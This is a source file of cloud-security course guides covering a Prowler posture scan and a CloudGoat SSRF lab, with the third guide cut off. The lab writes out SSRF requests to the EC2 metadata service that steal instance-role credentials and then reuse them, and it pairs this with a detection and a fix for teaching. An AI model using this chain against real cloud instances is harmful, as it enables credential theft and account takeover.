/**
 * Cloud-prep Engineer guides, projects 05–08.
 */
import type { ProjectGuide } from "@/lib/guides/types";

/* -------------------------------------------------------------------------- */
/* 05 — Run a full CSPM assessment and remediate it                            */
/* -------------------------------------------------------------------------- */

export const c05: ProjectGuide = {
  slug: "cspm-assessment",
  projectId: 5,
  intro:
    "<p>CSPM — Cloud Security Posture Management — is the practice of continuously checking a cloud account against a set of security rules. Commercial tools charge a great deal for this. <b>Prowler</b> does the same job, is open source, and runs hundreds of checks against the CIS Benchmark and other frameworks.</p><p>You are going to run a full assessment on your own account, triage the findings properly (most tools produce far more findings than anyone can act on), fix the important ones, and then re-scan to prove the fixes landed.</p><p>The triage is the skill. Anyone can run a scanner; the value is in knowing which of 200 findings actually matter and being able to justify that ranking.</p>",
  glossary: [
    {
      term: "CSPM",
      plain:
        "Automated checking of cloud configuration against security rules. Finds misconfigurations, not attacks.",
    },
    {
      term: "CIS Benchmark",
      plain:
        "A published, consensus set of security configuration recommendations. The AWS Foundations Benchmark is the de facto baseline for cloud accounts.",
    },
    {
      term: "Finding",
      plain: "One rule failing against one resource. A single misconfiguration can produce many findings.",
    },
    {
      term: "Compliance framework",
      plain:
        "A named set of requirements — CIS, PCI-DSS, HIPAA, SOC 2. Prowler can report against several at once.",
    },
    {
      term: "Risk acceptance",
      plain:
        "A documented decision not to fix something, with a reason and an owner. Perfectly legitimate; undocumented ignoring is not.",
    },
  ],
  before: [
    "<b>Projects 01–04 finished.</b> Prowler will find things you deliberately built, which makes the results easier to interpret.",
    "Python 3.9+ and the AWS CLI already authenticated.",
    "About 5 hours. The scan itself takes 10–30 minutes.",
  ],
  steps: [
    {
      title: "Install Prowler",
      time: "20 min",
      body: "<p>Install into a virtual environment so it stays isolated.</p>",
      commands: [
        {
          lang: "bash",
          code: "python3 -m venv ~/prowler-env\nsource ~/prowler-env/bin/activate\n\npip install prowler\nprowler --version",
        },
      ],
      expect: "<p>A version number, and Prowler reporting which providers it supports.</p>",
      expectCode: "Prowler 4.2.4\nAWS, Azure, GCP, Kubernetes",
      fixes: [
        {
          problem: "pip install fails building a dependency wheel",
          cause: "Missing build tools for a native extension.",
          fix: "<code>sudo apt install python3-dev build-essential</code> on Debian/Ubuntu, or use the container instead: <code>docker run --rm -v ~/.aws:/home/prowler/.aws toniblyx/prowler:latest aws</code>.",
        },
      ],
    },
    {
      title: "Give Prowler read-only access",
      time: "20 min",
      why: "Prowler needs to read configuration across many services. It never needs write access, and giving it write access is a needless risk.",
      warn: "Your lab-admin user from project 03 now has a least-privilege policy that will block most Prowler checks. Create a dedicated audit role rather than widening lab-admin back out.",
      body: "<p>AWS provides two managed policies that together are exactly what an auditor needs: <code>SecurityAudit</code> and <code>ViewOnlyAccess</code>.</p>",
      commands: [
        {
          lang: "bash",
          label: "Create the audit role",
          code: "ACCT=$(aws sts get-caller-identity --query Account --output text)\n\ncat > audit-trust.json <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [{\n    \"Effect\": \"Allow\",\n    \"Principal\": {\"AWS\": \"arn:aws:iam::$ACCT:root\"},\n    \"Action\": \"sts:AssumeRole\"\n  }]\n}\nEOF\n\naws iam create-role --role-name ProwlerAudit \\\n  --assume-role-policy-document file://audit-trust.json\n\naws iam attach-role-policy --role-name ProwlerAudit \\\n  --policy-arn arn:aws:iam::aws:policy/SecurityAudit\naws iam attach-role-policy --role-name ProwlerAudit \\\n  --policy-arn arn:aws:iam::aws:policy/job-function/ViewOnlyAccess",
        },
      ],
      expect: "<p>The role exists with two attached policies.</p>",
      expectCode:
        "$ aws iam list-attached-role-policies --role-name ProwlerAudit \\\n    --query 'AttachedPolicies[].PolicyName'\n[\n    \"SecurityAudit\",\n    \"ViewOnlyAccess\"\n]",
    },
    {
      title: "Run the assessment",
      time: "40 min (mostly waiting)",
      why: "Start with everything, then narrow. A first full scan tells you what your account actually looks like.",
      body: "<p>Run against your default region first — a full multi-region scan on a new account mostly reports on regions you have never used.</p>",
      commands: [
        {
          lang: "bash",
          label: "Full scan of one region",
          code: "prowler aws \\\n  --role \"arn:aws:iam::$ACCT:role/ProwlerAudit\" \\\n  --region us-east-1 \\\n  --output-formats csv json-ocsf html \\\n  --output-directory ./prowler-output",
        },
        {
          lang: "bash",
          label: "Or scoped to the CIS Benchmark only — faster and more actionable",
          code: "prowler aws \\\n  --role \"arn:aws:iam::$ACCT:role/ProwlerAudit\" \\\n  --region us-east-1 \\\n  --compliance cis_2.0_aws \\\n  --output-directory ./prowler-output",
        },
      ],
      expect:
        "<p>A live-updating summary, then a results directory. Do not be alarmed by the number of findings — a default account produces plenty, and most are low severity.</p>",
      expectCode:
        "Overview Results:\n  Critical: 0   High: 7   Medium: 23   Low: 41   Informational: 12\n\nDetailed results are in:\n - ./prowler-output/prowler-output-123456789012-20260726.html",
      fixes: [
        {
          problem: "\"An error occurred (AccessDenied) when calling AssumeRole\"",
          cause: "IAM propagation, or the trust policy does not name your account correctly.",
          fix: "Wait 30 seconds and retry. If it persists, run without <code>--role</code> using your existing credentials — for a lab that is acceptable.",
        },
        {
          problem: "The scan takes over an hour",
          cause: "It is checking every region.",
          fix: "Always pass <code>--region</code>. Add <code>--services iam,s3,cloudtrail,ec2</code> to narrow further.",
        },
      ],
    },
    {
      title: "Triage — this is the actual skill",
      time: "60 min",
      why: "A list of 83 findings helps nobody. Ranking them by real risk, and being able to defend the ranking, is what a security engineer is paid for.",
      body: "<p>Do not work top-to-bottom by the tool's severity. Rank by <b>exploitability × impact</b> in your specific account.</p><p>Three questions per finding: is it reachable from the internet, does it involve credentials or data, and is there a compensating control already in place? A HIGH on an internal resource behind a deny policy is genuinely less urgent than a MEDIUM on something internet-facing.</p>",
      commands: [
        {
          lang: "bash",
          label: "Extract just the failures",
          code: "cd prowler-output\nCSV=$(ls *.csv | head -1)\n\n# Count by severity\nawk -F';' 'NR>1 && $I ~ /FAIL/ {print}' \"$CSV\" | wc -l\n\n# Group failures by service and severity\npython3 - <<'EOF'\nimport csv, glob, collections\nf = glob.glob('*.csv')[0]\nrows = list(csv.DictReader(open(f), delimiter=';'))\nfails = [r for r in rows if r.get('STATUS') == 'FAIL']\nc = collections.Counter((r['SERVICE_NAME'], r['SEVERITY']) for r in fails)\nfor (svc, sev), n in sorted(c.items(), key=lambda x: -x[1]):\n    print(f'{n:4}  {sev:14} {svc}')\nEOF",
        },
        {
          lang: "bash",
          label: "The high-severity failures, in full",
          code: "python3 - <<'EOF'\nimport csv, glob\nf = glob.glob('*.csv')[0]\nfor r in csv.DictReader(open(f), delimiter=';'):\n    if r.get('STATUS') == 'FAIL' and r.get('SEVERITY') in ('critical', 'high'):\n        print(f\"[{r['SEVERITY'].upper()}] {r['CHECK_ID']}\")\n        print(f\"    {r['CHECK_TITLE']}\")\n        print(f\"    resource: {r['RESOURCE_UID'][:80]}\")\n        print(f\"    fix: {r['REMEDIATION_RECOMMENDATION_TEXT'][:150]}\\n\")\nEOF",
        },
      ],
      expect:
        "<p>A ranked shortlist. Build a triage table with: finding, tool severity, <b>your</b> severity, justification, and decision (fix now / fix later / accept). The column where your severity differs from the tool's is the most interesting one in the whole project.</p>",
      expectCode:
        "  12  medium         iam\n   7  high           s3\n   5  medium         cloudtrail\n   3  low            ec2",
    },
    {
      title: "Fix the top findings",
      time: "60 min",
      why: "Remediation is where you learn what the finding actually meant. Reading a check description teaches you much less than fixing it.",
      body: "<p>Work your shortlist. Common high-value fixes on a new account:</p>",
      commands: [
        {
          lang: "bash",
          label: "Enforce encryption at rest and versioning on buckets",
          code: "for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do\n  aws s3api put-bucket-encryption --bucket \"$b\" \\\n    --server-side-encryption-configuration \\\n    '{\"Rules\":[{\"ApplyServerSideEncryptionByDefault\":{\"SSEAlgorithm\":\"AES256\"},\"BucketKeyEnabled\":true}]}'\n\n  aws s3api put-bucket-versioning --bucket \"$b\" \\\n    --versioning-configuration Status=Enabled\n\n  echo \"hardened: $b\"\ndone",
        },
        {
          lang: "bash",
          label: "Enforce IMDSv2 on any running instances",
          code: "# IMDSv1 is how SSRF turns into stolen cloud credentials.\n# IMDSv2 requires a token, which SSRF generally cannot obtain.\nfor i in $(aws ec2 describe-instances \\\n           --query 'Reservations[].Instances[].InstanceId' --output text); do\n  aws ec2 modify-instance-metadata-options --instance-id \"$i\" \\\n    --http-tokens required --http-endpoint enabled\n  echo \"IMDSv2 enforced: $i\"\ndone",
        },
        {
          lang: "bash",
          label: "Tighten the password policy",
          code: "aws iam update-account-password-policy \\\n  --minimum-password-length 14 \\\n  --require-symbols --require-numbers \\\n  --require-uppercase-characters --require-lowercase-characters \\\n  --max-password-age 90 \\\n  --password-reuse-prevention 24",
        },
        {
          lang: "bash",
          label: "Delete access keys nobody uses",
          code: "for u in $(aws iam list-users --query 'Users[].UserName' --output text); do\n  for k in $(aws iam list-access-keys --user-name \"$u\" \\\n             --query 'AccessKeyMetadata[].AccessKeyId' --output text); do\n    last=$(aws iam get-access-key-last-used --access-key-id \"$k\" \\\n           --query 'AccessKeyLastUsed.LastUsedDate' --output text)\n    echo \"$u  $k  last used: ${last:-NEVER}\"\n  done\ndone\n# Then delete the unused ones deliberately, one at a time.",
        },
      ],
      expect:
        "<p>Each fix should map to a specific check ID in your triage table. Record which check each remediation closes — that traceability is what makes the re-scan meaningful.</p>",
      fixes: [
        {
          problem: "put-bucket-encryption fails on the CloudTrail bucket",
          cause: "It may already have encryption configured with a KMS key.",
          fix: "Check first: <code>aws s3api get-bucket-encryption --bucket NAME</code>. Already-encrypted is a pass, not a problem.",
        },
      ],
    },
    {
      title: "Re-scan and prove it",
      time: "30 min",
      why: "A remediation you have not verified is a remediation you hope happened. The before/after delta is the deliverable.",
      body: "<p>Run the identical scan and compare.</p>",
      commands: [
        {
          lang: "bash",
          label: "Re-scan into a separate directory",
          code: "prowler aws \\\n  --role \"arn:aws:iam::$ACCT:role/ProwlerAudit\" \\\n  --region us-east-1 \\\n  --output-directory ./prowler-after",
        },
        {
          lang: "bash",
          label: "Diff the two runs",
          code: "python3 - <<'EOF'\nimport csv, glob, collections\n\ndef load(pattern):\n    f = glob.glob(pattern)[0]\n    rows = list(csv.DictReader(open(f), delimiter=';'))\n    return {(r['CHECK_ID'], r['RESOURCE_UID']): r['STATUS'] for r in rows}\n\nbefore = load('prowler-output/*.csv')\nafter  = load('prowler-after/*.csv')\n\nfixed  = [k for k, v in before.items() if v == 'FAIL' and after.get(k) == 'PASS']\nbroke  = [k for k, v in before.items() if v == 'PASS' and after.get(k) == 'FAIL']\n\nprint(f'FIXED:  {len(fixed)}')\nfor c, r in sorted(fixed)[:20]:\n    print(f'   + {c}  {r[:60]}')\nprint(f'\\nREGRESSED: {len(broke)}')\nfor c, r in sorted(broke)[:20]:\n    print(f'   - {c}  {r[:60]}')\n\nbf = sum(1 for v in before.values() if v == 'FAIL')\naf = sum(1 for v in after.values()  if v == 'FAIL')\nprint(f'\\nFailures: {bf} -> {af}  ({100*(bf-af)//max(bf,1)}% reduction)')\nEOF",
        },
      ],
      expect:
        "<p>A concrete number. &ldquo;Reduced failing checks from 83 to 47, a 43% reduction, with all seven high-severity findings remediated&rdquo; is exactly the sentence to put in a report.</p>",
      expectCode:
        "FIXED:  36\n   + s3_bucket_default_encryption      arn:aws:s3:::cloudtrail-lab-1234...\n   + iam_password_policy_minimum_...   123456789012\n\nREGRESSED: 0\n\nFailures: 83 -> 47  (43% reduction)",
    },
    {
      title: "Document what you are not fixing",
      time: "35 min",
      why: "You will never fix everything, and pretending otherwise is what makes security reports untrustworthy. A documented risk acceptance is a professional artefact.",
      body: "<p>For each remaining finding, decide and record: fix later (with a date), accept (with a reason and an owner), or not applicable (with why). A finding with no decision is just clutter.</p>",
      commands: [
        {
          lang: "yaml",
          label: "risk-register.yml",
          code: "- check: cloudtrail_multi_region_enabled\n  status: ACCEPTED\n  severity_tool: medium\n  severity_assessed: low\n  reason: >\n    Lab account operates only in us-east-1. Multi-region logging would\n    triple log volume for regions that contain no resources.\n  compensating_control: >\n    Detection in project 04 alerts on any resource created outside\n    us-east-1, which would prompt enabling this.\n  owner: me\n  review_date: 2026-10-26\n\n- check: ec2_ebs_default_encryption\n  status: FIX_LATER\n  severity_tool: medium\n  severity_assessed: medium\n  reason: No EC2 instances exist yet; will enable before creating any.\n  owner: me\n  due: 2026-08-15\n\n- check: iam_root_hardware_mfa_enabled\n  status: ACCEPTED\n  severity_tool: high\n  severity_assessed: medium\n  reason: >\n    Virtual MFA is enabled on root. A hardware token is the stronger\n    control but is not justified for a lab account holding no data.\n  compensating_control: Root usage alerting from project 04.\n  owner: me\n  review_date: 2026-10-26",
        },
      ],
      expect:
        "<p>A risk register. Notice how each acceptance names a compensating control — an acceptance without one is just a shrug, and reviewers spot the difference immediately.</p>",
    },
    {
      title: "Automate it",
      time: "30 min",
      why: "A one-off scan is a snapshot. Posture drifts, and drift is what you actually want to catch.",
      body: "<p>Schedule the scan and alert on regression rather than on absolute count — a new failure is news, a long-standing accepted one is not.</p>",
      commands: [
        {
          lang: "bash",
          label: "scan.sh — run weekly from cron",
          code: "#!/usr/bin/env bash\nset -euo pipefail\nsource ~/prowler-env/bin/activate\n\nDATE=$(date +%Y-%m-%d)\nOUT=\"$HOME/prowler-history/$DATE\"\nmkdir -p \"$OUT\"\n\nprowler aws --region us-east-1 --output-directory \"$OUT\" \\\n  --output-formats csv >/dev/null 2>&1 || true\n\nFAILS=$(python3 -c \"\nimport csv,glob\nf=glob.glob('$OUT/*.csv')[0]\nprint(sum(1 for r in csv.DictReader(open(f),delimiter=';') if r['STATUS']=='FAIL'))\")\n\necho \"$DATE  $FAILS\" >> \"$HOME/prowler-history/trend.txt\"\n\nPREV=$(tail -2 \"$HOME/prowler-history/trend.txt\" | head -1 | awk '{print $2}')\nif [[ -n \"${PREV:-}\" && \"$FAILS\" -gt \"$PREV\" ]]; then\n  echo \"POSTURE REGRESSED: $PREV -> $FAILS failing checks\"\n  # aws sns publish --topic-arn \"$TOPIC\" --message \"...\"\nfi",
        },
        {
          lang: "bash",
          label: "Schedule it",
          code: "chmod +x scan.sh\n(crontab -l 2>/dev/null; echo \"0 6 * * 1 $HOME/scan.sh\") | crontab -\ncrontab -l",
        },
      ],
      expect:
        "<p>A weekly scan with a trend line. The trend is more useful than any single scan — a number that climbs tells you your controls are not holding.</p>",
    },
  ],
  after: [
    "Compare Prowler's output against AWS Security Hub's — they overlap heavily, and understanding where they differ tells you what each is really checking.",
    "Try <code>--compliance</code> with a different framework to see how the same account scores against different expectations.",
    "Keep the trend file. A graph of failing checks over time is a genuinely persuasive portfolio artefact.",
  ],
};

/* -------------------------------------------------------------------------- */
/* 06 — Cloud attack lab: exploit it, then detect it                           */
/* -------------------------------------------------------------------------- */

export const c06: ProjectGuide = {
  slug: "cloud-attack-lab",
  projectId: 6,
  intro:
    "<p>You cannot write a detection for an attack you have never seen. <b>CloudGoat</b> is a deliberately vulnerable AWS environment from Rhino Security Labs: it deploys a scenario, you attack it, and then you tear it down.</p><p>The twist in this project — and the part that makes it worth doing — is that after each attack you go back to CloudTrail and build the detection. Attack, then detect, then verify the detection would have caught you.</p><p>The headline lesson is usually the same one: the noisy step is rarely the detectable one. In the SSRF scenario the highest-fidelity signal is not the SSRF at all; it is instance role credentials being used from an IP address outside AWS.</p>",
  glossary: [
    {
      term: "CloudGoat",
      plain:
        "A tool that deploys intentionally vulnerable AWS infrastructure using Terraform, for practising attacks legally on your own account.",
    },
    {
      term: "SSRF",
      plain:
        "Server-Side Request Forgery — tricking a server into making a request on your behalf. In cloud, it is used to reach the instance metadata service and steal credentials.",
    },
    {
      term: "IMDS",
      plain:
        "Instance Metadata Service, at <code>169.254.169.254</code>. It hands out temporary credentials to whatever asks from the instance. IMDSv1 asks no questions; IMDSv2 requires a token.",
    },
    {
      term: "Instance role credentials",
      plain:
        "Temporary keys starting <code>ASIA</code> issued to an EC2 instance. If they are used from outside AWS, they have been stolen — there is no benign explanation.",
    },
    {
      term: "Terraform",
      plain:
        "Infrastructure-as-code. CloudGoat uses it to create and destroy scenarios, which is also why teardown is reliable.",
    },
  ],
  before: [
    "<b>Projects 01–04 finished.</b> You need CloudTrail flowing into CloudWatch Logs for the detection half.",
    "Terraform installed (<code>terraform -version</code>).",
    "About 8 hours across two sessions.",
  ],
  steps: [
    {
      title: "Understand the cost before you start",
      time: "10 min",
      warn: "CloudGoat creates real EC2 instances, load balancers, and RDS databases. A scenario left running costs roughly $1–3 per day. <b>Always destroy it the same day.</b>",
      why: "This is the most expensive project in the kit. Knowing the number up front is what stops it becoming a surprise.",
      body: "<p>Set a calendar reminder for four hours from now titled <b>&ldquo;destroy CloudGoat&rdquo;</b>. Then confirm your budget alert from project 01 is still active.</p>",
      commands: [
        {
          lang: "bash",
          code: "aws budgets describe-budgets \\\n  --account-id $(aws sts get-caller-identity --query Account --output text) \\\n  --query 'Budgets[].[BudgetName,BudgetLimit.Amount,CalculatedSpend.ActualSpend.Amount]' \\\n  --output table",
        },
      ],
      expect: "<p>Your $5 guardrail, with current spend well below it.</p>",
      expectCode: "|  lab-guardrail  |  5  |  0.34  |",
    },
    {
      title: "Install CloudGoat",
      time: "25 min",
      body: "<p>Clone and configure it. The whitelist step restricts the vulnerable infrastructure to your own IP, which matters — you are about to deploy something deliberately insecure onto the public internet.</p>",
      commands: [
        {
          lang: "bash",
          code: "git clone https://github.com/RhinoSecurityLabs/cloudgoat.git ~/cloudgoat\ncd ~/cloudgoat\n\npython3 -m venv venv && source venv/bin/activate\npip install -r requirements.txt\n\n./cloudgoat.py config profile     # choose your AWS CLI profile\n./cloudgoat.py config whitelist --auto   # restricts access to your IP only",
        },
      ],
      expect: "<p>A whitelist file containing your public IP in CIDR form.</p>",
      expectCode:
        "$ cat whitelist.txt\n203.0.113.45/32\n\n[cloudgoat] whitelist.txt created",
      fixes: [
        {
          problem: "config whitelist --auto fails",
          cause: "It calls an external service to discover your IP, which may be blocked.",
          fix: "Write it manually: <code>curl -s ifconfig.me &gt; whitelist.txt &amp;&amp; echo '/32' &gt;&gt; whitelist.txt</code> — make sure it ends up as a single line like <code>1.2.3.4/32</code>.",
        },
      ],
    },
    {
      title: "Deploy the SSRF scenario",
      time: "20 min (mostly Terraform)",
      warn: "This creates billable resources. The teardown step is step 8 and it is not optional.",
      body: "<p>The <code>ec2_ssrf</code> scenario is the best first one: it is realistic, it is short, and it teaches the single most important cloud attack pattern.</p>",
      commands: [
        {
          lang: "bash",
          code: "./cloudgoat.py create ec2_ssrf\n\n# Terraform runs for several minutes and then prints your starting credentials.",
        },
      ],
      expect:
        "<p>Starting credentials and a scenario directory. Note the timestamp — you are now paying for this.</p>",
      expectCode:
        "cloudgoat_output_solus_access_key_id = AKIAI...\ncloudgoat_output_solus_secret_key = wJalr...\n\n[cloudgoat] terraform apply completed with no error code.",
      fixes: [
        {
          problem: "Terraform fails with a quota or limit error",
          cause: "New accounts have low default service quotas.",
          fix: "Request a quota increase, or try a scenario with a smaller footprint (<code>iam_privesc_by_rollback</code> creates no compute at all).",
        },
      ],
    },
    {
      title: "Run the attack",
      time: "90 min",
      why: "Work it out rather than reading the answer. The struggle is where the understanding comes from — and the walkthrough will still be there if you get stuck.",
      body: "<p>The chain: use the starting credentials to enumerate, find the web application, exploit the SSRF to reach the metadata service, steal the instance role credentials, and use them to reach the objective.</p>",
      commands: [
        {
          lang: "bash",
          label: "Configure the starting credentials as a separate profile",
          code: "aws configure --profile cloudgoat\n# paste the access key and secret from the create output\n\naws sts get-caller-identity --profile cloudgoat",
        },
        {
          lang: "bash",
          label: "Enumerate what this identity can reach",
          code: "aws lambda list-functions --profile cloudgoat\naws ec2 describe-instances --profile cloudgoat \\\n  --query 'Reservations[].Instances[].[InstanceId,PublicIpAddress,State.Name]' \\\n  --output table",
        },
        {
          lang: "bash",
          label: "The SSRF — reach the metadata service through the app",
          code: "TARGET=<the public IP you found>\n\n# IMDSv1: no token needed, which is the vulnerability\ncurl \"http://$TARGET/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n\n# Then fetch the credentials for the role name it returns\ncurl \"http://$TARGET/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\"",
        },
        {
          lang: "bash",
          label: "Use the stolen credentials",
          code: "export AWS_ACCESS_KEY_ID=ASIA...\nexport AWS_SECRET_ACCESS_KEY=...\nexport AWS_SESSION_TOKEN=...\n\naws sts get-caller-identity     # you are now the instance role",
        },
      ],
      expect:
        "<p><code>get-caller-identity</code> returns an assumed-role ARN rather than your user. Note the key prefix: <code>ASIA</code> means temporary credentials, and that prefix is the thing your detection will key on.</p>",
      expectCode:
        "{\n    \"UserId\": \"AROAI...:i-0abc123def456\",\n    \"Account\": \"123456789012\",\n    \"Arn\": \"arn:aws:sts::123456789012:assumed-role/cg-ec2-role/i-0abc123def456\"\n}",
      fixes: [
        {
          problem: "The metadata request returns 401",
          cause: "The instance enforces IMDSv2, which requires a token first.",
          fix: "That is a hardened instance — and it is exactly the fix you will apply later. For the lab, confirm the scenario deployed with IMDSv1 as intended.",
        },
        {
          problem: "You cannot find the web application",
          cause: "The instance is still booting, or the whitelist does not include your current IP.",
          fix: "Wait five minutes. If your IP changed (mobile networks, VPN), re-run <code>./cloudgoat.py config whitelist --auto</code> and redeploy.",
        },
      ],
    },
    {
      title: "Now find yourself in the logs",
      time: "60 min",
      why: "This is the whole point. You know exactly what you did and when, so you can measure honestly what was and was not visible.",
      body: "<p>Go through the attack chain stage by stage and ask what CloudTrail recorded.</p>",
      commands: [
        {
          lang: "bash",
          label: "The enumeration you did",
          code: "aws cloudtrail lookup-events \\\n  --lookup-attributes AttributeKey=EventName,AttributeValue=DescribeInstances \\\n  --max-results 10 \\\n  --query 'Events[].[EventTime,Username,CloudTrailEvent]' --output json |\n  jq -r '.[] | \"\\(.[0])  \\(.[1])\"'",
        },
        {
          lang: "bash",
          label: "THE key query — instance credentials used from outside AWS",
          code: "QID=$(aws logs start-query \\\n  --log-group-name /aws/cloudtrail/lab \\\n  --start-time $(($(date +%s) - 7200)) --end-time $(date +%s) \\\n  --query-string '\n    fields @timestamp, userIdentity.arn, sourceIPAddress, eventName\n    | filter userIdentity.type = \"AssumedRole\"\n    | filter userIdentity.arn like /i-[0-9a-f]+$/\n    | stats count() as calls by userIdentity.arn, sourceIPAddress\n    | sort calls desc' \\\n  --query queryId --output text)\n\nsleep 8\naws logs get-query-results --query-id \"$QID\"",
        },
      ],
      expect:
        "<p>Two source IPs for the same instance role: the instance's own address (legitimate) and <b>yours</b> (the theft). That contrast is the detection. The SSRF request itself never appears in CloudTrail at all — it never touched an AWS API.</p>",
      expectCode:
        "userIdentity.arn                                    sourceIPAddress   calls\narn:aws:sts::...:assumed-role/cg-ec2-role/i-0abc     10.10.10.42       47\narn:aws:sts::...:assumed-role/cg-ec2-role/i-0abc     203.0.113.45      12   <- STOLEN",
    },
    {
      title: "Build the detection",
      time: "45 min",
      why: "Turn the observation into something that fires automatically. This detection has an almost perfect signal-to-noise ratio, which makes it one of the best in cloud security.",
      body: "<p>Instance role credentials used from a non-AWS IP is, with very few exceptions, always theft.</p>",
      commands: [
        {
          lang: "bash",
          label: "Metric filter + alarm",
          code: "aws logs put-metric-filter \\\n  --log-group-name /aws/cloudtrail/lab \\\n  --filter-name InstanceCredentialsOffInstance \\\n  --filter-pattern '{ ($.userIdentity.type = \"AssumedRole\") && ($.userIdentity.arn = \"*i-*\") && ($.sourceIPAddress != \"*.amazonaws.com\") && ($.sourceIPAddress != \"10.*\") && ($.sourceIPAddress != \"172.*\") && ($.sourceIPAddress != \"192.168.*\") }' \\\n  --metric-transformations \\\n      metricName=StolenInstanceCreds,metricNamespace=SecurityDetections,metricValue=1\n\nTOPIC=$(aws sns list-topics \\\n  --query \"Topics[?contains(TopicArn,'security-alerts')].TopicArn\" --output text)\n\naws cloudwatch put-metric-alarm \\\n  --alarm-name detect-stolen-instance-credentials \\\n  --alarm-description 'CRITICAL: EC2 instance role credentials used from outside the VPC' \\\n  --metric-name StolenInstanceCreds --namespace SecurityDetections \\\n  --statistic Sum --period 60 --threshold 1 \\\n  --comparison-operator GreaterThanOrEqualToThreshold \\\n  --evaluation-periods 1 --treat-missing-data notBreaching \\\n  --alarm-actions \"$TOPIC\"",
        },
        {
          lang: "bash",
          label: "Prove it fires — re-run the attack",
          code: "export AWS_ACCESS_KEY_ID=ASIA...\nexport AWS_SECRET_ACCESS_KEY=...\nexport AWS_SESSION_TOKEN=...\naws s3 ls\n\n# Then watch:\naws cloudwatch describe-alarms --alarm-names detect-stolen-instance-credentials \\\n  --query 'MetricAlarms[].StateValue' --output text",
        },
      ],
      expect:
        "<p>The alarm goes to ALARM and you get an email. You have now built a detection from an attack you performed yourself and verified it end to end — which is exactly the story to tell in an interview.</p>",
      fixes: [
        {
          problem: "The filter never matches",
          cause: "CloudWatch Logs filter patterns do not support real regex; the wildcards above are the whole vocabulary.",
          fix: "Test against a real event: copy one from <code>aws logs get-log-events</code> and run <code>aws logs test-metric-filter --filter-pattern '...' --log-event-messages 'THE_JSON'</code>.",
        },
      ],
    },
    {
      title: "Apply the fix that would have prevented it",
      time: "30 min",
      why: "Detection is the fallback. IMDSv2 removes the vulnerability outright, and knowing the difference between the two responses is the point.",
      body: "<p>IMDSv2 requires a PUT request to obtain a token before any metadata read. SSRF vulnerabilities generally cannot issue a PUT with custom headers, which is why this fix works so well.</p>",
      commands: [
        {
          lang: "bash",
          label: "Enforce IMDSv2 everywhere",
          code: "for i in $(aws ec2 describe-instances \\\n           --query 'Reservations[].Instances[].InstanceId' --output text); do\n  aws ec2 modify-instance-metadata-options --instance-id \"$i\" \\\n    --http-tokens required --http-endpoint enabled --http-put-response-hop-limit 1\ndone",
        },
        {
          lang: "bash",
          label: "Verify the attack no longer works",
          code: "curl \"http://$TARGET/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n# → 401 Unauthorized. The SSRF still exists; the credential theft does not.",
        },
        {
          lang: "bash",
          label: "Make it the default for new instances",
          code: "aws ec2 modify-instance-metadata-defaults \\\n  --http-tokens required --http-put-response-hop-limit 2",
        },
      ],
      expect:
        "<p>The metadata request now fails. Note carefully what changed and what did not: the SSRF vulnerability is still there, but it can no longer be escalated into stolen credentials. That distinction — breaking the chain rather than fixing every link — is a genuinely senior way to think.</p>",
    },
    {
      title: "DESTROY IT",
      time: "15 min",
      warn: "Do this now. Every hour you delay costs money, and a forgotten CloudGoat deployment is a vulnerable, internet-facing environment in your own account.",
      body: "<p>Tear down and then verify nothing survived — Terraform occasionally leaves orphans.</p>",
      commands: [
        {
          lang: "bash",
          label: "Destroy",
          code: "cd ~/cloudgoat\n./cloudgoat.py destroy ec2_ssrf\n\n# or destroy everything it created:\n# ./cloudgoat.py destroy all",
        },
        {
          lang: "bash",
          label: "Verify — all of these must come back empty",
          code: "aws ec2 describe-instances \\\n  --filters Name=instance-state-name,Values=running,pending,stopped \\\n  --query 'Reservations[].Instances[].[InstanceId,State.Name]' --output table\n\naws rds describe-db-instances --query 'DBInstances[].DBInstanceIdentifier'\naws elbv2 describe-load-balancers --query 'LoadBalancers[].LoadBalancerName'\naws ec2 describe-nat-gateways --query 'NatGateways[?State==`available`].NatGatewayId'",
        },
      ],
      expect:
        "<p>Everything empty. NAT gateways deserve special attention — they cost about $32/month and Terraform sometimes fails to remove them, which is the single most common cloud-lab bill shock.</p>",
      fixes: [
        {
          problem: "destroy fails partway through",
          cause: "Dependency ordering, or a resource modified outside Terraform (your IMDSv2 change can do this).",
          fix: "Run destroy again — it is idempotent and usually succeeds on the second pass. If a resource persists, delete it manually in the console and re-run.",
        },
      ],
    },
    {
      title: "Write it up",
      time: "40 min",
      body: "<p>Document the attack chain and, for each stage, whether it was visible in logs and what you built to catch it. Include the honest gaps — the SSRF request itself produced no AWS-side telemetry at all, and saying so is more impressive than pretending full coverage.</p><p>Then note the two-layer response: IMDSv2 as prevention, the credential-use detection as the fallback for when prevention is missing somewhere.</p>",
      expect:
        "<p>A write-up with an attack chain table, a detection you built and verified, and the preventive fix. That combination is unusual in a junior portfolio.</p>",
    },
  ],
  after: [
    "<b>Check your bill tomorrow.</b> Confirm the destroy actually stopped the charges.",
    "Try <code>iam_privesc_by_rollback</code> next — it creates no compute, so it is nearly free, and it teaches a completely different attack class.",
    "Read Rhino Security Labs' AWS privilege escalation research. It is the reference on the subject and it is free.",
  ],
};

/* -------------------------------------------------------------------------- */
/* 07 — Secure the pipeline: IaC scanning and keyless deploys                  */
/* -------------------------------------------------------------------------- */

export const c07: ProjectGuide = {
  slug: "secure-cicd-pipeline",
  projectId: 7,
  intro:
    "<p>Two things go wrong in cloud CI/CD, and both are extremely common. Infrastructure-as-code gets merged with an insecure configuration nobody reviewed, and long-lived cloud credentials get stored in the CI system where anyone with repository access can reach them.</p><p>You are going to fix both: add automated scanning that blocks insecure Terraform before it merges, and replace stored AWS keys with <b>OIDC</b> — short-lived credentials issued per workflow run, with no secret stored anywhere.</p><p>The OIDC part is the one that impresses. Most teams still have static keys in their CI, and being able to explain why that is bad and how to fix it is a strong, concrete talking point.</p>",
  glossary: [
    {
      term: "IaC",
      plain:
        "Infrastructure as Code — defining cloud resources in files (Terraform, CloudFormation) rather than clicking in a console. Reviewable and repeatable.",
    },
    {
      term: "IaC scanning",
      plain:
        "Checking those files for insecure configuration before they are applied. Far cheaper than finding the same problem in production.",
    },
    {
      term: "OIDC",
      plain:
        "OpenID Connect. Lets GitHub prove to AWS who it is, so AWS can issue temporary credentials — no stored secret at all.",
    },
    {
      term: "Trust policy",
      plain:
